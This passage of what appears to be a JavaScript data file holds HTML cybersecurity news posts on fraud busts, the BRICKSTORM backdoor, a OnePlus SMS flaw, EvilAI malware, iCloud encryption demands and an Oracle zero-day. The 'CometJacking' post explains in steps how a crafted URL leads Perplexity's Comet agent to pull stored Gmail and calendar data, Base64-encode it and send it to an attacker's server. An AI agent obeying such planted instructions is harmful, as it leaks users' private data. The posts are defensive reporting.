        <b>23 different countries</b> with the promise of guaranteed investment returns—before  
        disappearing with their money.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#232526,#414345); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#ffd166;">💰 Inside the Fraud Operation</h3><br>
      <p>
        The criminals created <b>fake investment platforms</b> designed to look legitimate,  
        convincing victims to deposit large sums. Once the money was transferred,  
        the platforms vanished—along with the criminals behind them.  
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📉 False promises of “guaranteed profits”</li>
        <li>🌍 Victims spread across Europe and beyond</li>
        <li>⛔ Criminals vanished after cashing out deposits</li>
      </ul>
      <p>
        Authorities confirmed <b>five arrests</b> in a joint Europol-Eurojust operation.  
        Bank accounts and assets tied to the scam have already been frozen.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f2027,#2c5364); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🌍 Why This Bust Matters</h3><br>
      <p>
        This crackdown is one of <b>Europe’s largest crypto fraud takedowns</b>,  
        proving how global cooperation is vital against cross-border financial cybercrime.  
        Thousands of victims can now see justice as assets are recovered and operations dismantled.  
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#fafafa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🚀 Lessons Learned</h3><br>
      <p>
        If an investment promises <b>risk-free high returns</b>, it’s almost always a scam.  
        This case highlights the importance of <b>financial awareness and vigilance</b> in an age  
        where fraudsters exploit global trust in digital platforms.
      </p>
    </section>
  `},{id:"brickstorm-backdoor-unc5221-2025",title:"BRICKSTORM Backdoor: China-Linked Hackers Breach U.S. Firms",summary:"UNC5221 (China-linked actors) used a stealthy backdoor called BRICKSTORM to infiltrate legal, SaaS and tech firms — hiding for 393 days while exfiltrating emails and cloning servers.",date:"2025-09-25",author:"EthicalByte",tags:["UNC5221","BRICKSTORM","Advanced Persistent Threat","Backdoor","Data Exfiltration","Supply Chain"],imageKey:"brickstormBackdoorBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#071024,#0e2740); border-radius:12px; color:#eef6fb;">
      <h3 style="color:#ff6b6b;">🚨 BRICKSTORM: Stealthy 393-Day Intrusion</h3><br>
      <p>
        Security researchers have uncovered a long-running intrusion by a group tracked as <b>UNC5221</b>, leveraging a custom backdoor named <b>BRICKSTORM</b>.  
        The adversary infiltrated top U.S. legal, SaaS, and technology firms and remained undetected for <b>393 days</b>, quietly stealing emails, cloning servers, and moving laterally across environments.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0b2a3a,#113b53); border-radius:12px; color:#e6f2f8; margin-top:15px;">
      <h3 style="color:#ffd166;">⚙️ How BRICKSTORM Operates</h3><br>
      <p>
        BRICKSTORM is designed for persistence and low-observability. Key tactics observed include:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔒 <b>Stealthy persistence</b> via custom service installers and manipulated startup items</li>
        <li>📨 <b>Email harvesting</b> — exfiltrating mailboxes and archived correspondence</li>
        <li>🖥️ <b>Server cloning</b> to reproduce critical VMs/services for deeper lateral movement</li>
        <li>🕵️ <b>Living-off-the-land techniques</b> to avoid signature-based detection</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#062033,#0b2a3d); border-radius:12px; color:#dff3fb; margin-top:15px;">
      <h3 style="color:#7be495;">🔍 Indicators & Detection Challenges</h3><br>
      <p>
        The campaign’s stealth made detection difficult. Observed challenges include:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>❗ <b>Low-and-slow data exfiltration</b> that blends into normal traffic</li>
        <li>❗ <b>Custom tooling</b> that lacks public IoCs for signature detection</li>
        <li>❗ Use of <b>legitimate admin utilities</b> and scheduled tasks to mask activity</li>
      </ul>
      <p>
        Analysts recommend focusing on <b>anomalous account activity, unexpected service clones, and unusual outbound connections</b> rather than relying solely on known IoCs.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#12202b,#243b55); border-radius:12px; color:#ecfbff; margin-top:15px;">
      <h3 style="color:#90caf9;">🌍 Impact on Victims</h3><br>
      <p>
        Victims included high-value targets with sensitive client data and intellectual property. Consequences observed:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📧 Compromised attorney-client correspondence and internal communications</li>
        <li>⚙️ Cloned production servers enabling further covert access and sabotage risk</li>
        <li>🔗 Elevated supply-chain risk as SaaS integrations and third-party connectors were abused</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#08121a,#0d2b3b); border-radius:12px; color:#d8f3ff; margin-top:15px;">
      <h3 style="color:#ff9f43;">🛡️ Recommended Immediate Actions</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔁 Rotate & revoke credentials and API tokens for suspected accounts and services</li>
        <li>🔎 Hunt for cloned VM/service artifacts and unexpected disk images</li>
        <li>🧯 Ensure EDR & telemetry capture is enabled for long-term baselining and retrospective analysis</li>
        <li>🔐 Enforce strict least-privilege policies and break overly broad service permissions</li>
        <li>📢 Notify customers & stakeholders if sensitive client data may have been exposed</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:#f3f9fb; border-radius:12px; color:#122233; margin-top:15px;">
      <h3 style="color:#2563eb;">✅ Final Thoughts</h3><br>
      <p>
        BRICKSTORM shows how advanced actors can combine custom backdoors, living-off-the-land techniques, and patient operations to steal high-value data while remaining invisible.  
        The modern defense playbook must include threat hunting, aggressive credential hygiene, and continuous telemetry — because long dwell times cause the most damage.
      </p>
    </section>
  `},{id:"oneplus-cve-2025-10184",title:"⚠️ OnePlus OxygenOS Flaw Exposes MFA SMS Codes",summary:"A high-severity vulnerability (CVSS 8.2) in OxygenOS allows malicious apps to read SMS—including multi-factor authentication codes—without user consent.",date:"2025-09-26",author:"EthicalByte",tags:["OnePlus","Vulnerability","CVE-2025-10184","Android Security","MFA Bypass"],imageKey:"oneplusSMSVuln",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 Critical Flaw in OxygenOS Exposes Your Messages</h3><br>
      <p>
        Security researchers have uncovered a dangerous flaw — <b>CVE-2025-10184</b> — impacting 
        OnePlus devices running <b>OxygenOS 12 and later</b>. The vulnerability (CVSS 8.2) allows 
        <b>any malicious app</b> installed on the device to <b>read SMS messages without permission</b>, 
        including sensitive <b>MFA codes</b>, bank OTPs, and account verification texts.
      </p>
      <p>
        Even more concerning: the issue has remained unpatched since <b>2021</b>, putting millions of users at risk.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#1a1a40); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ffd166;">📱 What Makes CVE-2025-10184 So Dangerous?</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🚫 No permissions needed — malware can read SMS silently</li>
        <li>🔑 MFA, OTPs, and 2FA codes can be intercepted in real-time</li>
        <li>📤 Attackers can use stolen codes to take over accounts and bypass security</li>
        <li>🕵️ Potential for large-scale credential theft and financial fraud</li>
      </ul>
      <p>
        The vulnerability bypasses Android’s standard permission model, exposing users even if they follow best security practices.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🧪 Current Status & OnePlus Response</h3><br>
      <p>
        OnePlus has acknowledged the report and stated that they are <b>“actively investigating”</b> the vulnerability.  
        However, no official patch or update timeline has been announced as of yet.
      </p>
      <p>
        Users running OxygenOS 12 and newer versions should treat this vulnerability as an active risk.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ How to Protect Yourself</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Avoid installing apps from unknown sources or sideloading APKs</li>
        <li>✔️ Use an authenticator app instead of SMS-based 2FA where possible</li>
        <li>✔️ Monitor device permissions and uninstall suspicious apps</li>
        <li>✔️ Apply security patches immediately once available</li>
      </ul>
      <p>
        Until OnePlus issues a fix, <b>your best defense is caution</b>. Treat every app installation as a potential risk.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">✅ Final Thoughts</h3><br>
      <p>
        CVE-2025-10184 is a stark reminder that <b>even trusted OEM software can introduce massive security gaps</b>.  
        Until OxygenOS receives a patch, treat your SMS inbox as <b>compromised territory</b> — and shift to 
        more secure authentication methods immediately.
      </p>
    </section>
  `},{id:"evilai-malware-campaign-2025",title:"EvilAI Malware Masquerades as AI Tools in Global Attack",summary:"A stealthy new malware campaign, 'EvilAI', is hiding inside legitimate AI and productivity apps — targeting critical sectors worldwide with advanced evasion tactics.",date:"2025-09-30",author:"EthicalByte",tags:["EvilAI","Malware","AI Threats","Cybersecurity","Global Campaign"],imageKey:"evilaiMalwareBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 EvilAI: The Malware Hiding in Plain Sight</h3><br>
      <p>
        A new wave of cyberattacks is sweeping across industries — and this time, it's hiding in plain sight.  
        Dubbed <b>"EvilAI"</b>, the campaign involves malicious code embedded inside seemingly legitimate AI and productivity tools, now infecting organizations in <b>India, the U.S., France, Brazil</b>, and beyond.
      </p>
      <p>
        Unlike traditional malware, EvilAI blends perfectly with business workflows, bypassing most security tools and staying undetected for weeks — or even months.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#ffd166;">🧠 How EvilAI Works</h3><br>
      <p>
        This is not a typical malicious payload. EvilAI leverages legitimate features and developer frameworks to hide its activity:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ Uses <b>valid code-signing certificates</b> to appear authentic</li>
        <li>🔐 Encrypts command-and-control (C2) traffic with <b>AES encryption</b></li>
        <li>🧩 Exploits <b>NeutralinoJS</b> to execute payloads inside trusted app processes</li>
        <li>🦠 Deploys modular components for <b>data theft, credential harvesting,</b> and <b>persistence</b></li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🏭 Targeted Industries</h3><br>
      <p>
        EvilAI is targeting sectors where disruption or data theft has maximum impact. Current intelligence points to attacks against:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🏭 <b>Manufacturing</b> – Industrial espionage and supply chain disruptions</li>
        <li>🏥 <b>Healthcare</b> – Patient record theft and ransomware staging</li>
        <li>🏛️ <b>Government</b> – Surveillance and long-term espionage</li>
        <li>💻 <b>Tech Companies</b> – Source code exfiltration and backdoor planting</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ff4d6d;">⚠️ Why It’s So Dangerous</h3><br>
      <p>
        EvilAI is redefining how malware operates. By <b>hiding inside trusted applications</b> and <b>using real developer techniques</b>, it bypasses antivirus engines, EDR systems, and even zero-trust policies.  
        Once inside, it establishes persistence, spreads laterally, and can <b>harvest sensitive data silently</b>.
      </p>
      <p>
        Even seasoned security teams are finding it difficult to distinguish legitimate AI behavior from malicious activity.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2196f3;">🔍 Final Thoughts</h3><br>
      <p>
        <b>EvilAI</b> proves that the future of cyberattacks is not brute force — it's <b>deception</b>.  
        As AI tools become ubiquitous, security teams must scrutinize even trusted software for hidden threats.  
        The question is no longer “Is this app safe?” but “Do I know <b>what’s running inside</b> it?”
      </p>
    </section>
  `},{id:"uk-bitcoin-seizure-2025",title:"U.K. Police Seize £5.5B in Bitcoin – Largest Crypto Bust Ever",summary:"A Chinese fraudster behind a massive crypto scam laundering 61,000 BTC is caught in London, marking the world’s largest Bitcoin seizure.",date:"2025-10-01",author:"EthicalByte",tags:["Crypto Crime","Bitcoin","UK Police","Money Laundering","Cybercrime"],imageKey:"ukBitcoinBust",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#f8f9fa;">
      <h3 style="color:#ff4d6d;">🚨 £5.5 Billion Bitcoin Seized in Record-Breaking Operation</h3><br>
      <p>
        In one of the most staggering cryptocurrency crackdowns ever recorded, 
        <b>U.K. police seized £5.5 billion ($7.4 billion)</b> worth of Bitcoin — marking the <b>largest crypto confiscation in history</b>.  
        The operation targeted a Chinese national accused of orchestrating a massive fraud scheme that victimized more than 
        <b>128,000 people worldwide</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#2c003e); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ffd166;">💰 How the Billion-Dollar Scam Worked</h3><br>
      <p>
        The suspect allegedly <b>laundered stolen funds into 61,000 BTC</b>, cleverly spreading the cryptocurrency across 
        various wallets to evade detection.  
        Using <b>fake identities and shell accounts</b>, the fraudster attempted to remain undetected while transferring 
        illicit gains into digital assets.
      </p>
      <p>
        Investigators revealed that the stolen money came from a sophisticated investment scam targeting users across multiple countries.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🏙️ The Mistake That Got Her Caught</h3><br>
      <p>
        After months of digital laundering, the scammer made a critical error: attempting to <b>purchase high-end property in London</b>.  
        This triggered scrutiny from financial watchdogs, who flagged the transactions, leading to her arrest and the historic seizure.
      </p>
      <p>
        Authorities also discovered <b>multiple fake passports and identities</b> used to mask her real identity.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🌍 Why This Seizure Matters</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>💸 Largest Bitcoin confiscation in global history</li>
        <li>👮‍♂️ Huge blow to international money-laundering networks</li>
        <li>🔎 Proves traditional law enforcement is adapting to digital finance</li>
      </ul>
      <p>
        This case highlights how cybercriminals are evolving — but so are investigators.  
        Even in the decentralized world of crypto, <b>law enforcement is catching up</b>.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#0f172a); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">✅ Final Thoughts</h3><br>
      <p>
        The £5.5 billion Bitcoin seizure is more than a victory for U.K. police — it’s a warning to cybercriminals worldwide.  
        In the age of digital finance, <b>no amount of obfuscation can guarantee anonymity forever</b>.
      </p>
    </section>
  `},{id:"uk-apple-icloud-backdoor-2025",title:"UK Demands Apple Break iCloud Encryption for Britons",summary:"New British order challenges Apple’s encryption policy, forcing potential access to iCloud backups of UK users. Critics say this could weaken global data security.",date:"2025-10-03",author:"EthicalByte",tags:["UK","Apple","iCloud","Encryption Backdoor","Privacy","Tech Policy"],imageKey:"ukAppleBackdoorBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 U.K. Orders Apple to Break iCloud Encryption</h3><br>
      <p>
        In a dramatic escalation of privacy vs. security tensions, the <b>U.K. government</b> has issued a new order compelling Apple to disable or bypass encryption on iCloud backups of British users.  
        This move comes after Apple earlier disabled its <b>Advanced Data Protection (ADP)</b> for UK users under pressure.  
        The order reportedly covers <b>entire data categories</b> — not just narrow or case-by-case access.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ffd166;">🔐 What’s Being Demanded</h3><br>
      <p>
        The request (widely described as a <b>Technical Capability Notice</b>) isn’t just about disabling ADP — it seeks mechanisms for access across <b>photos, messages, device backups, files, notes</b>, and more that are stored in iCloud.  
        Practically, this would require <b>breaking end-to-end encryption coverage</b> or preventing it from being applied in the first place.
      </p>
      <p>
        Apple has previously argued that any exceptional access creates <b>systemic risk</b> and undermines user trust, even when intended for lawful purposes.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0b2436,#0f3350); border-radius:12px; color:#e6f2f8; margin-top:15px;">
      <h3 style="color:#7bdff2;">🔎 Quick Primer: What is Advanced Data Protection (ADP)?</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🧩 <b>ADP</b> extends end-to-end encryption to additional iCloud categories (like device backups and Photos), so <b>only you</b> hold the keys.</li>
        <li>🔑 With ADP on, even Apple can’t access the protected content — which is why governments target it.</li>
        <li>🌐 Turning ADP off reverts some data to server-side encryption where Apple holds recovery keys.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">⚠️ Why This Is Dangerous</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🛡 Weakening encryption in one jurisdiction creates a <b>global attack surface</b> for criminals and hostile states.</li>
        <li>🔓 Any “lawful access” capability becomes a <b>high-value target</b> for exploitation.</li>
        <li>🌐 Sets a precedent: other countries may push for the <b>same backdoor</b> or broader access.</li>
        <li>🤝 Undermines <b>user trust</b> and the viability of cloud security guarantees.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#12202b,#243b55); border-radius:12px; color:#ecfbff; margin-top:15px;">
      <h3 style="color:#90caf9;">🧭 Possible Paths Apple Could Take</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>⚖️ <b>Legal pushback</b> (appeals/limited compliance) — arguing that broad backdoors are disproportionate.</li>
        <li>🗺️ <b>Regional feature changes</b> — limiting ADP in certain markets (privacy impact + fragmentation risk).</li>
        <li>🔒 <b>Technical redesigns</b> to reduce Apple’s key custody even further, minimizing compelled access.</li>
        <li>📣 <b>Transparency updates</b> — clarifying what data remains end-to-end encrypted vs server-side encrypted.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a1a,#2b2b2b); border-radius:12px; color:#f1f1f1; margin-top:15px;">
      <h3 style="color:#ffe066;">🛡 What UK Users Can Do Right Now</h3><br>
      <ul style="margin-left:20px; line-height:1.9;">
        <li>🔑 Prefer <b>non-SMS 2FA</b> (authenticator apps or passkeys) for Apple ID and critical accounts.</li>
        <li>🧰 Use <b>end-to-end encrypted apps</b> for chat/files (iMessage E2EE, FaceTime, or third-party E2EE services).</li>
        <li>💽 Keep <b>local encrypted backups</b> (Finder/iTunes with encrypted backup) if ADP isn’t available.</li>
        <li>🗂️ Regularly review <b>iCloud Data Categories</b> and disable sync for data you prefer to keep only on-device.</li>
        <li>🧾 Monitor Apple’s <b>security advisories</b> and enable <b>advanced logging</b> where possible.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ff4d6d;">🏢 For Enterprises & Regulated Teams</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📜 Update <b>data residency & lawful access</b> language in vendor risk assessments.</li>
        <li>🔐 Enforce <b>device encryption + MDM</b> restrictions on cloud sync for sensitive roles.</li>
        <li>🕵️ Adopt <b>client-side E2EE tooling</b> for legal, medical, and finance workflows.</li>
        <li>🧪 Perform <b>tabletop exercises</b> simulating compelled access and cross-border requests.</li>
      </ul>
    </section>

    <section style="padding:20px; background:#0f1924; border-radius:12px; color:#d7e9ff; margin-top:15px;">
      <h3 style="color:#64dfdf;">🗓️ Context & Timeline (High Level)</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔐 Apple expands <b>ADP</b> to cover more iCloud categories (stronger E2EE).</li>
        <li>🇬🇧 UK pushes for access under <b>Investigatory Powers Act</b> mechanisms.</li>
        <li>🧭 Ongoing back-and-forth: regional feature limits, legal challenges, and new orders.</li>
      </ul>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#222; margin-top:15px;">
      <h3 style="color:#2563eb;">❓FAQ: Common Questions</h3><br>
      <p><b>Q: Does this mean Apple can read my iCloud data now?</b><br>
      <i>A:</i> Not automatically. This is about <b>compelled capability</b>. Whether and how it’s enforced, and which categories are affected, depends on Apple’s response and legal processes.</p>
      <p><b>Q: Is iMessage still end-to-end encrypted?</b><br>
      <i>A:</i> Yes. But <b>message backups</b> in iCloud are the sensitive area if E2EE isn’t applied to backups (that’s what ADP addresses).</p>
      <p><b>Q: What if I already use ADP?</b><br>
      <i>A:</i> Keep it enabled where available. If ADP isn’t offered in your region/account, rely on <b>local encrypted backups</b> and on-device storage for highly sensitive data.</p>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">✅ Final Thoughts</h3><br>
      <p>
        The UK’s push to force Apple into breaking encryption reignites a global debate:  
        Can you demand security from companies <b>without</b> eroding the very foundations of digital privacy?  
        In attempting to protect citizens, governments may create a <b>single point of failure</b> that endangers everyone.
      </p>
    </section>
  `},{id:"cometjacking-insider-threat-2025",title:"CometJacking: One Click Turns Perplexity’s AI into an Insider Threat",summary:"A new exploit called 'CometJacking' abuses Perplexity’s AI agent memory to exfiltrate sensitive data — including Gmail and Calendar — with a single malicious URL, no credentials required.",date:"2025-10-05",author:"EthicalByte",tags:["AI Security","CometJacking","Perplexity","Insider Threat","Data Exfiltration"],imageKey:"cometJackingBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 CometJacking: Turning AI Against You</h3><br>
      <p>
        Security researchers have uncovered a dangerous new exploit called <b>CometJacking</b> — a technique that turns Perplexity’s AI agent, <b>Comet</b>, into a stealthy insider threat with just one malicious link.
      </p>
      <p>
        A single crafted URL can <b>hijack the Comet agent</b>, query its internal memory (<code>collection=...</code>), and <b>exfiltrate sensitive data</b> such as Gmail contents or calendar events <b>without requiring any credentials</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ffd166;">🧠 How the Exploit Works</h3><br>
      <p>
        Comet’s internal memory feature is designed to store contextual information from previous sessions to improve responses. However, attackers discovered they could <b>trick the agent into exposing this memory</b> remotely through a simple <b>GET request</b>.
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ Step 1: Host a malicious URL embedding a query that targets the Comet memory API.</li>
        <li>✅ Step 2: The agent reads and processes the request — <b>no auth or permissions required</b>.</li>
        <li>✅ Step 3: Exfiltrated data is <b>Base64-encoded</b> and sent off-box to an attacker-controlled server.</li>
      </ul>
      <p>
        Because the action occurs within the context of a “trusted” AI agent, <b>traditional security tools fail to flag the activity</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">⚠️ Real-World Impact</h3><br>
      <p>
        CometJacking shows how <b>AI memory itself can become a data leak vector</b>.  
        Sensitive corporate data, emails, cloud tokens, calendar details, and internal conversations — once stored for context — can be quietly siphoned off by malicious actors.
      </p>
      <p>
        The risk is amplified because <b>no credentials, phishing, or malware deployment</b> are required. A single URL click is enough.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">🛡️ Defenses and Mitigations</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔐 Restrict agent memory exposure with <b>access control layers</b> and validation checks.</li>
        <li>🚫 Disable or isolate sensitive memory storage in production environments.</li>
        <li>📊 Implement <b>URL sanitization</b> and strict query whitelisting before processing requests.</li>
        <li>🧠 Monitor LLM agents for <b>unexpected outbound traffic</b> or Base64 data streams.</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🚀 Final Thoughts</h3><br>
      <p>
        CometJacking proves that <b>AI systems are not just attack targets — they can become attackers themselves</b>.  
        As enterprise adoption of agentic AI accelerates, organizations must treat these systems like any other endpoint: <b>monitor, restrict, and harden them</b>.
      </p>
    </section>
  `},{id:"oracle-ebs-zero-day-cl0p-2025",title:"Oracle Patches CVE-2025-61882: Cl0p Exploits Live Zero-Day in EBS",summary:"Oracle released an emergency patch for a critical 9.8 flaw in E-Business Suite (CVE-2025-61882), which is being actively exploited by Cl0p to steal data. The exploit enables remote code execution without authentication. Apply immediately. ",date:"2025-10-06",author:"EthicalByte",tags:["Oracle","EBS","Zero-Day","Cl0p","RCE","Cybersecurity"],imageKey:"oracleEBSZeroDayBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0a0a0a,#1f1f3a); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d4d;">🚨 Oracle Rushes Patch for Critical EBS Zero-Day</h3><br>
      <p>
        Oracle has issued an emergency security alert for **CVE-2025-61882**, a **critical 9.8 CVSS** vulnerability in E-Business Suite (EBS).  
        This flaw allows unauthenticated remote attackers to execute code on vulnerable instances without needing usernames or passwords. 
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#dfe7f0; margin-top:15px;">
      <h3 style="color:#ffd166;">🧠 How It’s Being Exploited</h3><br>
      <p>
        Evidence suggests the Cl0p ransomware/extortion group is actively leveraging this zero-day to steal data from victim EBS environments.   
        In many cases, victims have received extortion emails claiming their data is already compromised.
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ The vulnerability affects EBS versions "12.2.3 through 12.2.14", specifically in the Concurrent Processing / BI Publisher integration.</li>
        <li>✅ Attackers may exploit it by sending crafted HTTP requests to vulnerable endpoints.</li>
        <li>✅ Because it’s unauthenticated, common defenses (like requiring login) are bypassed.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">⚠️ Why This Is Alarming</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔐 Zero-day RCE with **no credentials needed** — extremely dangerous.</li>
        <li>💼 EBS is often central to enterprise operations (finance, HR, supply chain) — breach impact is high.</li>
        <li>💸 The linkage to **Cl0p extortion** means data theft might already be in progress. </li>
        <li>⚠️ Many organizations may already be compromised but unaware.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#d1e0f0; margin-top:15px;">
      <h3 style="color:#ff4d6d;">🛡 Mitigation & Next Steps</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ Immediately apply Oracle’s patch for CVE-2025-61882. </li>
        <li>✅ Compare configured endpoints to known vulnerable paths and apply firewall rules.</li>
        <li>✅ Monitor for anomalous activity, especially suspicious HTTP requests or data exfiltration traffic.</li>
        <li>✅ Review Oracle’s advisory and risk matrices in their patch documentation.</li>
        <li>✅ For organizations that can’t patch immediately, isolate or disable exposed modules if feasible.</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">✅ Final Thoughts</h3><br>
      <p>
        CVE-2025-61882 is not just another zero-day — it’s a critical entry point with direct ties to data theft and extortion.  
        If you run Oracle EBS, your top priority must be patching immediately and validating your environment for any signs of compromise.  
        The time to act is already overdue.
      </p>
    </section>
  `},{id:"weekly-cyber-recap-2025-10-05",title:"Weekly Cyber Recap — Patch Fast. Detect Early. Defend Better.",summary:"This week’s cybersecurity roundup highlights why rapid patching, proactive detection, and future-proof defense strategies are essential against evolving threats — from zero-day exploits to new browser-based attack vectors.",date:"2025-10-07",author:"EthicalByte",tags:["Weekly Recap","Zero-Day","Patch Now","Threat Intelligence","Defense"],imageKey:"weeklyRecapBannerOct2025",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#eef2ff;">
      <h3 style="color:#60a5fa;">⚡ The Threat Landscape Never Slows Down</h3><br>
      <p>
        Cybersecurity is an ongoing race — one where every second counts. As attackers innovate, organizations must continuously adapt. 
        This week’s major headlines remind us that security isn’t about reacting — it’s about anticipating. From emergency patches for actively exploited 
        vulnerabilities to sophisticated phishing campaigns bypassing MFA, defenders must remain vigilant, proactive, and informed.
      </p>
      <p>
        In this recap, we break down the most important lessons: <b>patch smarter</b> to shrink your attack surface, <b>detect early</b> before intrusions escalate, 
        and <b>prepare for what’s next</b> — because the next breach is already being planned.
      </p>
    </section>

